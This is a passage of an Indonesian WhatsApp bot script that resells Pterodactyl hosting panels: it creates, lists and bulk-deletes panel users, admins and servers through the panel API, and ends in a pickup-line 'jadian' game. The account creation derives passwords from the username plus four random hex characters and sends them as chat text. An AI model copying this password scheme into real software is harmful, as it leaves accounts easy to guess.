* *Ram :* ${ram == "0" ? "Unlimited" : ram.split("").length > 4 ? ram.split("").slice(0,2).join("") + "GB" : ram.charAt(0) + "GB"}
* *Cpu :* ${cpu == "0" ? "Unlimited" : cpu+"%"}
* *Disk :* ${disknya == "0" ? "Unlimited" : disknya.split("").length > 4 ? disknya.split("").slice(0,2).join("") + "GB" : disknya.charAt(0) + "GB"}
* *Expired Server :* 1 Bulan

*Rules Pembelian Panel ⚠️*
* Simpan Data Ini Sebaik Mungkin, Seller Hanya Mengirim 1 Kali!
* Data Hilang/Lupa Akun, Seller Tidak Akan Bertanggung Jawab!
* Garansi Aktif 10 Hari (1x replace)
* Claim Garansi Wajib Membawa Bukti Ss Chat Saat Pembelian
`
try {
    const msg = generateWAMessageFromContent(m.sender, {
        viewOnceMessage: {
            message: {
                messageContextInfo: {
                    deviceListMetadata: {},
                    deviceListMetadataVersion: 2
                },
                interactiveMessage: proto.Message.InteractiveMessage.create({
                    // TEKS UTAMA PESAN
                    body: proto.Message.InteractiveMessage.Body.create({
                        text: teks // pastikan variabel `teks` sudah didefinisikan
                    }),
                    header: proto.Message.InteractiveMessage.Header.create({
                        title: name || 'Lyrra-MD', // opsional
                        subtitle: '',
                        hasMediaAttachment: false
                    }),
                    nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                        buttons: [
                            {
                                name: "cta_copy",
                                buttonParamsJson: JSON.stringify({
                                    display_text: "Copy User",
                                    id: user.username,
                                    copy_code: user.username
                                })
                            },
                            {
                                name: "cta_copy",
                                buttonParamsJson: JSON.stringify({
                                    display_text: "Copy Password",
                                    id: password.toString(),
                                    copy_code: password.toString()
                                })
                            },
                            {
                                name: "cta_url",
                                buttonParamsJson: JSON.stringify({
                                    display_text: "Login",
                                    url: global.domain,
                                    merchant_url: global.domain
                                })
                            }
                        ]
                    })
                })
            }
        }
    }, {});

    await sock.relayMessage(msg.key.remoteJid, msg.message, {
        messageId: msg.key.id
    });

} catch (e) {
    console.error('❌ Error mengirim tombol salin:', e);
}
delete global.panel
break
}
case "listadmin": {
if (!isOwner) return reply(mess.owner)
let cek = await fetch(domain + "/api/application/users?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let res2 = await cek.json();
let users = res2.data;
if (users.length < 1 ) return m.reply("Tidak ada admin panel")
var teks = "\n *乂 List admin panel pterodactyl*\n"
await users.forEach((i) => {
if (i.attributes.root_admin !== true) return
teks += `\n* ID : *${i.attributes.id}*
* Nama : *${i.attributes.first_name}*
* Created : ${i.attributes.created_at.split("T")[0]}\n`
})
await sock.sendMessage(m.chat, {text: teks}, {quoted: fakeQuoted})
}
break



case "listpanel": case "listp": case "listserver": {

if (!isOwner) return reply(mess.owner)
let f = await fetch(domain + "/api/application/servers?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
});
let res = await f.json();
let servers = res.data;
if (servers.length < 1) return m.reply("Tidak Ada Server Bot")
let messageText = "\n *乂 List server panel pterodactyl*\n"
for (let server of servers) {
let s = server.attributes
let f3 = await fetch(domain + "/api/client/servers/" + s.uuid.split`-`[0] + "/resources", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + capikey
}
})
let data = await f3.json();
let status = data.attributes ? data.attributes.current_state : s.status;
messageText += `\n* ID : *${s.id}*
* Nama : *${s.name}*
* Ram : *${s.limits.memory == 0 ? "Unlimited" : s.limits.memory.toString().length > 4 ? s.limits.memory.toString().split("").slice(0,2).join("") + "GB" : s.limits.memory.toString().length < 4 ? s.limits.memory.toString().charAt(1) + "GB" : s.limits.memory.toString().charAt(0) + "GB"}*
* CPU : *${s.limits.cpu == 0 ? "Unlimited" : s.limits.cpu.toString() + "%"}*
* Disk : *${s.limits.disk == 0 ? "Unlimited" : s.limits.disk.length > 3 ? s.limits.disk.toString().charAt(1) + "GB" : s.limits.disk.toString().charAt(0) + "GB"}*
* Created : ${s.created_at.split("T")[0]}\n`
}
await sock.sendMessage(m.chat, {text: messageText}, {quoted: fakeQuoted})
}
break

case "deladmin": {

if (!isOwner) return reply(mess.owner)
if (!text) return m.reply("idnya")
let cek = await fetch(domain + "/api/application/users?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let res = await cek.json();
let users = res.data;
let getid = null
let idadmin = null
await users.forEach(async (e) => {
if (e.attributes.id == args[0] && e.attributes.root_admin == true) {
getid = e.attributes.username
idadmin = e.attributes.id
let delusr = await fetch(domain + `/api/application/users/${idadmin}`, {
"method": "DELETE",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let res = delusr.ok ? {
errors: null
} : await delusr.json()
}
})
if (idadmin == null) return m.reply("Akun admin panel tidak ditemukan!")
await m.reply(`Berhasil menghapus akun admin panel *${getid}*`)
}
break


case "delpanel": {

if (!isOwner) return reply(mess.owner)
if (!text) return m.reply("idnya")
let f = await fetch(domain + "/api/application/servers?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let result = await f.json()
let servers = result.data
let sections
let nameSrv
for (let server of servers) {
let s = server.attributes
if (Number(text) == s.id) {
sections = s.name.toLowerCase()
nameSrv = s.name
let f = await fetch(domain + `/api/application/servers/${s.id}`, {
"method": "DELETE",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
}
})
let res = f.ok ? {
errors: null
} : await f.json()
}}
let cek = await fetch(domain + "/api/application/users?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let res = await cek.json();
let users = res.data;
for (let user of users) {
let u = user.attributes
if (u.first_name.toLowerCase() == sections) {
let delusr = await fetch(domain + `/api/application/users/${u.id}`, {
"method": "DELETE",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let res = delusr.ok ? {
errors: null
} : await delusr.json()
}}
if (sections == undefined) return m.reply("Server panel tidak ditemukan!")
m.reply(`Berhasil menghapus server panel *${nameSrv}*`)
}
break


// ############# Cpanel V2
// ===============================
// CLEAR SERVER
// ===============================
case "clearserver-v2": {
    if (!isOwner) return reply(mess.owner)
const data = await ptlaRequestV2("/api/application/servers");

    if (!data || !data.data) return reply("❌ Tidak bisa mengambil data server!");

    let total = 0;
    for (let srv of data.data) {
        const id = srv.attributes.id;
        await ptlaRequestV2(`/api/application/servers/${id}`, "DELETE");
        total++;
    }

    reply(`✔️ ${total} server berhasil dihapus (ptla).`);
}
break;



// ===============================
// CLEAR USER
// ===============================
case "clearuser-v2": {
    if (!isOwner) return reply(mess.owner)
const data = await ptlaRequestV2("/api/application/users");

    if (!data || !data.data) return reply("❌ Tidak bisa mengambil data user!");

    let total = 0;
    for (let user of data.data) {
        const id = user.attributes.id;
        await ptlaRequestV2(`/api/application/users/${id}`, "DELETE");
        total++;
    }

    reply(`🧹 ${total} user berhasil dihapus (ptla).`);
}
break;



// ===============================
// CLEAR ADMIN
// ===============================
case "clearadmin-v2": {
    if (!isOwner) return reply(mess.owner)
const data = await ptlaRequestV2("/api/application/users");

    if (!data || !data.data) return reply("❌ Tidak bisa mengambil data admin!");

    let total = 0;
    for (let user of data.data) {
        // hanya delete root_admin = true
        if (user.attributes.root_admin) {
            const id = user.attributes.id;
            await ptlaRequestV2(`/api/application/users/${id}`, "DELETE");
            total++;
        }
    }

    reply(`🗑️ ${total} admin berhasil dihapus (ptla).`);
}
break;
case "cadmin-v2": {
if (!isOwner) return reply(mess.owner)
if (!text) return m.reply("username")
let username = text.toLowerCase()
let email = username+"@gmail.com"
let name = capital(args[0])
let password = username+crypto.randomBytes(2).toString('hex')
let f = await fetch(domainV2 + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV2
},
"body": JSON.stringify({
"email": email,
"username": username.toLowerCase(),
"first_name": name,
"last_name": "Admin",
"root_admin": true,
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2))
let user = data.attributes
var orang
if (m.isGroup) {
orang = m.sender
await m.reply("*Berhasil membuat admin panel ✅*\nData akun sudah di kirim ke private chat")
} else {
orang = m.chat
}
var teks = `
*Berhasil Membuat Admin Panel ✅*

* *ID User :* ${user.id}
* *Nama :* ${user.first_name}
* *Username :* ${user.username}
* *Password :* ${password.toString()}
* *Login :* ${global.domainV2}

*Rules Admin Panel ⚠️*
* Jangan Maling SC, Ketahuan Maling ? Auto Delete Akun & No Reff!!
* Simpan Baik² Data Akun Ini
* Buat Panel Seperlunya Aja, Jangan Asal Buat!
* Garansi Aktif 10 Hari
* Claim Garansi Wajib Membawa Bukti Ss Chat Saat Pembelian
`
await sock.sendMessage(orang, {text: teks}, {quoted: fakeQuoted})
}
break
case "1gb-v2": case "2gb-v2": case "3gb-v2": case "4gb-v2": case "5gb-v2": case "6gb-v2": case "7gb-v2": case "8gb-v2": case "9gb-v2": case "10gb-v2": case "unlimited-v2": case "unli-v2": {
if (!isOwner && isPremium) return reply(mess.prem)
if (!text) return m.reply("username")
global.panel = text
var ram
var disknya
var cpu
if (command == "1gb-v2") {
ram = "1000"
disknya = "1000"
cpu = "40"
} else if (command == "2gb-v2") {
ram = "2000"
disknya = "1000"
cpu = "60"
} else if (command == "3gb-v2") {
ram = "3000"
disknya = "2000"
cpu = "80"
} else if (command == "4gb-v2") {
ram = "4000"
disknya = "2000"
cpu = "100"
} else if (command == "5gb-v2") {
ram = "5000"
disknya = "3000"
cpu = "120"
} else if (command == "6gb-v2") {
ram = "6000"
disknya = "3000"
cpu = "140"
} else if (command == "7gb-v2") {
ram = "7000"
disknya = "4000"
cpu = "160"
} else if (command == "8gb-v2") {
ram = "8000"
disknya = "4000"
cpu = "180"
} else if (command == "9gb-v2") {
ram = "9000"
disknya = "5000"
cpu = "200"
} else if (command == "10gb-v2") {
ram = "10000"
disknya = "5000"
cpu = "220"
} else {
ram = "0"
disknya = "0"
cpu = "0"
}
let username = global.panel.toLowerCase()
let email = username+"@gmail.com"
let name = capital(username) + " Server"
let password = username+crypto.randomBytes(2).toString('hex')
let f = await fetch(domainV2 + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV2
},
"body": JSON.stringify({
"email": email,
"username": username.toLowerCase(),
"first_name": name,
"last_name": "Server",
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2))
let user = data.attributes
let desc = tanggal(Date.now())
let usr_id = user.id
let f1 = await fetch(domainV2 + `/api/application/nests/${nestidV2}/eggs/` + eggV2, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV2
}
})
let data2 = await f1.json();
let startup_cmd = data2.attributes.startup
let f2 = await fetch(domainV2 + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV2,
},
"body": JSON.stringify({
"name": name,
"description": desc,
"user": usr_id,
"egg": parseInt(eggV2),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": ram,
"swap": 0,
"disk": disknya,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 5
},
deploy: {
locations: [parseInt(locV2)],
dedicated_ip: false,
port_range: [],
},
})
})
let result = await f2.json()
if (result.errors) return m.reply(JSON.stringify(result.errors[0], null, 2))
let server = result.attributes
var orang
if (m.isGroup) {
orang = m.sender
await m.reply("*Berhasil membuat panel ✅*\nData akun sudah dikirim ke privat chat")
} else {
orang = m.chat
}
var teks = `
*Berhasil Membuat Akun Panel ✅*

* *ID Server :* ${server.id}
* *Nama :* ${name}
* *Username :* ${user.username}
* *Password :* ${password}
* *Login :* ${global.domainV2}
* *Ram :* ${ram == "0" ? "Unlimited" : ram.split("").length > 4 ? ram.split("").slice(0,2).join("") + "GB" : ram.charAt(0) + "GB"}
* *Cpu :* ${cpu == "0" ? "Unlimited" : cpu+"%"}
* *Disk :* ${disknya == "0" ? "Unlimited" : disknya.split("").length > 4 ? disknya.split("").slice(0,2).join("") + "GB" : disknya.charAt(0) + "GB"}
* *Expired Server :* 1 Bulan

*Rules Pembelian Panel ⚠️*
* Simpan Data Ini Sebaik Mungkin, Seller Hanya Mengirim 1 Kali!
* Data Hilang/Lupa Akun, Seller Tidak Akan Bertanggung Jawab!
* Garansi Aktif 10 Hari (1x replace)
* Claim Garansi Wajib Membawa Bukti Ss Chat Saat Pembelian
`
await sock.sendMessage(orang, {text: teks}, {quoted: fakeQuoted})
delete global.panel
}
break

//================================================================================

case "listadmin-v2": {
if (!isOwner) return reply(mess.owner)
let cek = await fetch(domainV2 + "/api/application/users?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV2
}
})
let res2 = await cek.json();
let users = res2.data;
if (users.length < 1 ) return m.reply("Tidak ada admin panel")
var teks = "\n *乂 List admin panel pterodactyl*\n"
await users.forEach((i) => {
if (i.attributes.root_admin !== true) return
teks += `\n* ID : *${i.attributes.id}*
* Nama : *${i.attributes.first_name}*
* Created : ${i.attributes.created_at.split("T")[0]}\n`
})
await sock.sendMessage(m.chat, {text: teks}, {quoted: fakeQuoted})
}
break

//================================================================================

case "listpanel-v2": {
if (!isOwner) return reply(mess.owner)
let f = await fetch(domainV2 + "/api/application/servers?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV2
}
});
let res = await f.json();
let servers = res.data;
if (servers.length < 1) return m.reply("Tidak Ada Server Bot")
let messageText = "\n *乂 List server panel pterodactyl*\n"
for (let server of servers) {
let s = server.attributes
let f3 = await fetch(domainV2 + "/api/client/servers/" + s.uuid.split`-`[0] + "/resources", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + capikeyV2
}
})
let data = await f3.json();
let status = data.attributes ? data.attributes.current_state : s.status;
messageText += `\n* ID : *${s.id}*
* Nama : *${s.name}*
* Ram : *${s.limits.memory == 0 ? "Unlimited" : s.limits.memory.toString().length > 4 ? s.limits.memory.toString().split("").slice(0,2).join("") + "GB" : s.limits.memory.toString().length < 4 ? s.limits.memory.toString().charAt(1) + "GB" : s.limits.memory.toString().charAt(0) + "GB"}*
* CPU : *${s.limits.cpu == 0 ? "Unlimited" : s.limits.cpu.toString() + "%"}*
* Disk : *${s.limits.disk == 0 ? "Unlimited" : s.limits.disk.length > 3 ? s.limits.disk.toString().charAt(1) + "GB" : s.limits.disk.toString().charAt(0) + "GB"}*
* Created : ${s.created_at.split("T")[0]}\n`
}
await sock.sendMessage(m.chat, {text: messageText}, {quoted: fakeQuoted})
}
break

//================================================================================

case "deladmin-v2": {
if (!isOwner) return reply(mess.owner)
if (!text) return m.reply("idnya")
let cek = await fetch(domainV2 + "/api/application/users?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV2
}
})
let res2 = await cek.json();
let users = res2.data;
let getid = null
let idadmin = null
await users.forEach(async (e) => {
if (e.attributes.id == args[0] && e.attributes.root_admin == true) {
getid = e.attributes.username
idadmin = e.attributes.id
let delusr = await fetch(domainV2 + `/api/application/users/${idadmin}`, {
"method": "DELETE",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV2
}
})
let res = delusr.ok ? {
errors: null
} : await delusr.json()
}
})
if (idadmin == null) return m.reply("Akun admin panel tidak ditemukan!")
await m.reply(`Berhasil menghapus akun admin panel *${capital(getid)}*`)
}
break

//================================================================================

case "delpanel-v2": {

if (!isOwner) return reply(mess.owner)
if (!text) return m.reply("idnya")
let f = await fetch(domainV2 + "/api/application/servers?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV2
}
})
let result = await f.json()
let servers = result.data
let sections
let nameSrv
for (let server of servers) {
let s = server.attributes
if (Number(text) == s.id) {
sections = s.name.toLowerCase()
nameSrv = s.name
let f = await fetch(domainV2 + `/api/application/servers/${s.id}`, {
"method": "DELETE",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV2,
}
})
let res = f.ok ? {
errors: null
} : await f.json()
}}
let cek = await fetch(domainV2 + "/api/application/users?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV2
}
})
let res2 = await cek.json();
let users = res2.data;
for (let user of users) {
let u = user.attributes
if (u.first_name.toLowerCase() == sections) {
let delusr = await fetch(domainV2 + `/api/application/users/${u.id}`, {
"method": "DELETE",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV2
}
})
let res = delusr.ok ? {
errors: null
} : await delusr.json()
}}
if (sections == undefined) return m.reply("Server panel tidak ditemukan!")
m.reply(`Berhasil menghapus server panel *${capital(nameSrv)}*`)
}
break
///########## [ Fun ]
case 'tembak':
            case 'jadian': {
              if (!m.isGroup) return onlyGrup()
              let user = m.mentionedJid[0] || (m.quoted ? m.quoted.sender : "")
              if (!user) return m.reply(`*Tag/Reply Seseorang!*\n\nContoh:\n${prefix + command} @0`)
              if (user === m.sender) return m.reply("Halah mawunya jadian sama diri sendiri😢")
              if (user === botNumber) return m.reply("😓Aku hanya sebuah bot maaf")
              sock.jadian = sock.jadian ? sock.jadian : {}
              let pasangan = db.users[user].pacar
              let pasangan2 = db.users[m.sender].pacar
              if (pasangan2 === user) {
                m.reply(`Kamu kan udah jadian smaa dia 😤`)
              } else if (pasangan) {
                sock.sendTextWithMentions(m.chat, `Target udah punya pacar😔😭\n\n@${pasangan.split("@")[0]} ayangmu mo diambil😢`, m)
              } else if (pasangan2) {
                sock.sendTextWithMentions(m.chat, `Hayoloo mau selingkuh😔\n\n@${pasangan2.split("@")[0]} tengok nihh kelakuan ayangmu😤`, m)
              } else {
                let ktnmbk = [
                  "Ada saat di mana aku nggak suka sendiri. Tapi aku juga nggak mau semua orang menemani, hanya kamu yang kumau.",
                  "Aku baru sadar ternyata selama ini kamu kaya! Kaya yang aku cari selama ini. Kamu mau nggak jadi pacarku?",
                  "Aku berterima kasih pada mataku, sebab mata inilah yang menuntunku untuk menemukanmu.",
                  "Aku boleh kirim CV ke kamu nggak? Soalnya aku mau ngelamar jadi pacar.",
                  "Aku bukan yang terhebat, namun aku yakin kalau aku mampu membahagiakanmu dengan bermodalkan cinta dan kasih sayang, kamu mau kan denganku?",
                  "Aku hanya cowok biasa yang memiliki banyak kekurangan dan mungkin tak pantas mengharapkan cintamu, namun jika kamu bersedia menerimaku menjadi kekasih, aku berjanji akan melakukan apa pun yang terbaik untukmu. Maukah kamu menerima cintaku?",
                  "Aku ingin bilang sesuatu. Udah lama aku suka sama aku, tapi aku nggak berani ngomong. Jadi, kuputuskan untuk WA saja. Aku pengin kamu jadi pacarku.",
                  "Aku ingin mengungkapkan sebuah hal yang tak sanggup lagi aku pendam lebih lama. Aku mencintaimu, maukah kamu menjadi pacarku?",
                  "Aku ingin menjadi orang yang bisa membuatmu tertawa dan tersenyum setiap hari. Maukah kau jadi pacarku?",
                  "Aku mau chat serius sama kamu. Selama ini aku memendam rasa ke kamu dan selalu memperhatikanmu. Kalau nggak keberatan, kamu mau jadi pacarku?",
                  "Aku melihatmu dan melihat sisa hidupku di depan mataku.",
                  "Aku memang tidak mempunyai segalanya, tapi setidaknya aku punya kasih sayang yang cukup buat kamu.",
                  "Aku menyukaimu dari dulu. Kamu begitu sederhana, tetapi kesederhanaan itu sangat istimewa di selaput mataku. Akan sempurna jika kamu yang menjadi spesial di hati.",
                  "Aku naksir banget sama kamu. Maukah kamu jadi milikku?",
                  "Aku nggak ada ngabarin kamu bukan karena aku gak punya kuota atau pulsa, tapi lagi menikmati rasa rindu ini buat kamu. Mungkin kamu akan kaget mendengarnya. Selama ini aku menyukaimu.",
                  "Aku nggak pengin kamu jadi matahari di hidupku, karena walaupun hangat, kamu sangat jauh. Aku juga nggak mau kamu jadi udara, karena walaupun aku butuh dan kamu sangat dekat, tapi semua orang juga bisa menghirupmu. Aku hanya ingin kamu jadi darah yang bisa sangat dekat denganku.",
                  "Aku nggak tahu sampai kapan usiaku berakhir. Yang aku tahu, cintaku ini selamanya hanya untukmu.",
                  "Aku sangat menikmati waktu yang dihabiskan bersama hari ini. Kita juga sudah lama saling mengenal. Di hari yang cerah ini, aku ingin mengungkapkan bahwa aku mencintaimu.",
                  "Aku selalu membayangkan betapa indahnya jika suatu saat nanti kita dapat membina bahtera rumah tangga dan hidup bersama sampai akhir hayat. Namun, semua itu tak mungkin terjadi jika kita berdua sampai saat ini bahkan belum jadian. Maukah kamu menjadi kekasihku?",
                  "Aku siapkan mental untuk hari ini. Kamu harus menjadi pacarku untuk mengobati rasa cinta yang sudah tak terkendali ini.",
                  "Aku tahu kita gak seumur, tapi bolehkan aku seumur hidup sama kamu?",
                  "Aku tahu kita sudah lama sahabatan. Tapi nggak salah kan kalau aku suka sama kamu? Apa pun jawaban kamu aku terima. Yang terpenting itu jujur dari hati aku yang terdalam.",
                  "Aku tak bisa memulai ini semua terlebih dahulu, namun aku akan berikan sebuah kode bahwa aku menyukai dirimu. Jika kau mengerti akan kode ini maka kita akan bersama.",
                  "Aku yang terlalu bodoh atau kamu yang terlalu egois untuk membuat aku jatuh cinta kepadamu.",
                  "Apa pun tentangmu, tak pernah ku temukan bosan di dalamnya. Karena berada di sampingmu, anugerah terindah bagiku. Jadilah kekasihku, hey kamu.",
                  "Atas izin Allah dan restu mama papa, kamu mau nggak jadi pacarku?",
                  "Bagaimana kalau kita jadi komplotan pencuri? Aku mencuri hatimu dan kau mencuri hatiku.",
                  "Bahagia itu kalau aku dan kamu telah menjadi kita.",
                  "Besok kalau udah nggak gabut, boleh nggak aku daftar jadi pacar kamu. Biar aku ada kerjaan buat selalu mikirin kamu.",
                  "Biarkan aku membuatmu bahagia selamanya. Kamu hanya perlu melakukan satu hal: Jatuh cinta denganku.",
                  "Biarkan semua kebahagiaanku menjadi milikmu, semua kesedihanmu menjadi milikku. Biarkan seluruh dunia menjadi milikmu, hanya kamu yang menjadi milikku!",
                  "Biarlah yang lalu menjadi masa laluku, namun untuk masa kini maukah kamu menjadi masa depanku?",
                  "Bisakah kamu memberiku arahan ke hatimu? Sepertinya aku telah kehilangan diriku di matamu.",
                  "Bukanlah tahta ataupun harta yang aku cari, akan tetapi balasan cintaku yang aku tunggu darimu. Dijawab ya.",
                  "Caramu bisa membuatku tertawa bahkan di hari-hari tergelap membuatku merasa lebih ringan dari apa pun. Aku mau kamu jadi milikku.",
                  "Cinta aku ke kamu itu jangan diragukan lagi karena cinta ini tulus dari lubuk hati yang paling dalam.",
                  "Cintaku ke kamu tuh kayak angka 5 sampai 10. Nggak ada duanya. Aku mau kamu jadi satu-satunya wanita di hatiku.",
                  "Cowok mana yang berani-beraninya nyakitin kamu. Sini aku obati, asal kamu mau jadi pacar aku.",
                  "Hai, kamu lagi ngapain? Coba deh keluar rumah dan lihat bulan malam ini. Cahayanya indah dan memesona, tapi akan lebih indah lagi kalau aku ada di sampingmu. Gimana kalau kita jadian, supaya setelah malam ini bisa menatap rembulan sama-sama?",
                  "Hidupku indah karena kamu bersamaku, kamu membuatku bahagia bahkan jika aku merasa sedih dan rendah. Senyummu menerangi hidupku dan semua kegelapan menghilang. Maukah kamu menjadi milikku?",
                  "Ini bukan rayuan, tapi ini yang aku rasakan. Aku ingin bertukar tulang denganmu. Aku jadi tulang punggungmu, kamu jadi tulang rusukku. Jadian yuk!",
                  "Ini cintaku, ambillah. Ini jiwaku, gunakan itu. Ini hatiku, jangan hancurkan. Ini tanganku, pegang dan bersama-sama kita akan membuatnya abadi.",
                  "Izinkan aku mengatakan sesuatu yang menurutku sangat penting. Hey, kau punya tempat di hatiku yang tidak bisa dimiliki oleh orang lain. Tetaplah di sana dan jadilah kekasihku. Mau?",
                  "Jika aku bisa memberimu hadiah, aku akan memberimu cinta dan tawa, hati yang damai, mimpi dan kegembiraan khusus selamanya. Biarkan aku melakukannya sekarang.",
                  "Kalau aku matahari, kamu mau nggak jadi langitku? Biar setiap saat setiap waktu bisa selalu bersama tanpa terpisah waktu.",
                  "Kalau kamu membuka pesan ini, berarti kamu suka sama aku. Kalau kamu membalas pesan ini, artinya kamu sayang sama aku. Kalau kamu mengabaikan pesan ini, berarti kamu cinta sama aku. Kalau kamu menghapus pesan ini, artinya kamu mau menerimaku jadi pacarmu.",
                  "Kalau kau bertanya-tanya apakah aku mencintaimu atau tidak, jawabannya adalah iya.",
                  "Kamu adalah satu-satunya yang lebih mengerti aku daripada diriku sendiri. Kamu adalah satu-satunya yang dapat ku bagi segalanya, bahkan rahasia pribadiku. Aku ingin kamu selalu bersamaku. Aku mencintaimu.",
                  "Kamu harus membiarkan aku mencintaimu, biarkan aku menjadi orang yang memberimu semua yang kamu inginkan dan butuhkan.",
                  "Kamu itu beda dari cewek lain, kamu antik jarang ditemukan di tempat lain. Maukah kamu jadi pacar aku?",
                  "Kamu kenal Iwan nggak? Iwan to be your boy friend.",
                  "Kamu mau nggak jadi matahari di kehidupanku? Kalau mau, menjauhlah 149.6 juta KM dari aku sekarang!",
                  "Kamu nggak capek HTS-an sama aku? Aku capek tiap hari jemput kamu, nemenin kamu pas lagi bad mood, menghibur kamu pas lagi sedih. Kita pacaran aja, yuk?",
                  "Kamu nggak sadar ya, nggak perlu capek nyari kesana kemari, orang yang tulus mencintai kamu ada di depan mata. Iya, aku.",
                  "Kamu pantas mendapatkan yang terbaik, seseorang yang akan mendukungmu tanpa batas, membiarkanmu tumbuh tanpa batas, dan mencintaimu tanpa akhir. Apakah kamu akan membiarkan aku menjadi orangnya?",
                  "Kamu tahu enggak kenapa aku ngambil jurusan elektro? Karena aku mau bikin pembangkit listrik tenaga cinta kita, supaya rumah tangga kita nanti paling terang.",
                  "Kamu tahu kenapa hari ini aku menyatakan semua ini padamu? Karena aku lebih memilih untuk malu karena menyatakan cinta ditolak ketimbang menyesal karena orang lain yang lebih dulu menyatakannya.",
                  "Kamu telah hidup dalam mimpiku untuk waktu yang lama, bagaimana jika menjadikannya nyata untuk sekali saja?",
                  "Kenapa aku baru sadar, ternyata selama ini hatiku nyaman bersanding denganmu. Aku mau kamu jadi milikku.",
                  "kepada cewek incaran bukanlah perkara yang mudah. Ada banyak hal yang perlu dipertimbangkan agar cintamu bisa diterima si doi. Selain memilih waktu yang tepat, kata-kata untuk nembak cewek pun harus dipersiapkan.",
                  "Ketika aku bertemu denganmu, aku tak peduli dengan semuanya. Namun, ketika kamu pergi jauh dariku aku selalu mengharapkanmu. Dan apakah ini cinta?",
                  "Ketika engkau memandangku, engkau akan melihat fisikku. Tetapi ketika engkau melihat hatiku, engkau akan menemukan dirimu sendiri ada di sana.",
                  "Ketika Hawa tercipta buat sang Adam, begitu indah kehidupan mereka izinkan aku menjadi sang Adam/Hawa buatmu karena aku sangat mencintaimu.",
                  "Ketika mata ini memandang raut wajahmu yang indah, hanya tiga kata yang terucap dari lubuk hatiku yang paling dalam 'aku cinta kamu'.",
                  "Kita udah saling tahu masa lalu masing-masing. Tapi itu tidak penting karena sekarang aku hanya ingin membicarakan tentang masa depan. Mulai hari ini dan seterusnya, maukah kamu menjadi pacarku?",
                  "Ku beranikan hari ini untuk mengungkapkan yang selama ini menjadi resah. Resah jika kamu tak menjadi milikku selamanya.",
                  "Lebih spesial dari nasi goreng, lebih indah dari purnama. Ya, jika kamu yang temani akhir hidupku.",
                  "Maaf sebelumnya karena cuma bisa bilang lewat WA. Sebenarnya, selama ini aku memendam cinta dan aku ingin kamu jadi pacarku. Mau?",
                  "Makanan busuk memanglah bau, kalau dimakan rasanya pahit sepahit jamu. Sebenarnya aku ingin kamu tahu, aku mau kamu terima cintaku.",
                  "Makan tahu bumbu petis. Merenung sambil makan buah duku. Aku bukan lelaki yang romantis. Namun, maukah kau jadi pacarku?",
                  "Makasih, ya, selama ini sudah mau temani aku. Entah itu dalam suka ataupun duka. Tapi sekarang aku mau kamu berubah. Aku mau kamu bukan lagi jadi temanku, tapi aku mau kamu jadi pacarku.",
                  "Malam ini sangat indah dengan cahaya rembulan yang memesona namun akan lebih indah kalau kamu resmi menjadi milikku.",
                  "Mataku mencarimu ketika kamu tidak ada. Hatiku sakit ketika aku tidak menemukanmu. Kamu adalah alasan untuk semua kebahagiaanku dan tanpamu hidupku akan sangat membosankan. Maukah kamu terus bersamaku?",
                  "Mau jadi pacarku nggak, lagi gabut nih. Coba dulu 1 bulan kalau nyaman lanjut deh.",
                  "Menjadi teman memang menyenangkan. Akan lebih membahagiakan jika kamu menjadi milikku.",
                  "Meski jarang buat kamu tertawa, setidaknya saya tidak selalu buat kamu sedih. Tapi kalau akhirnya humor saya tidak membuatmu tertawa lagi, semoga sedih saya bisa kamu tertawakan, ya. - Zarry Hendrik",
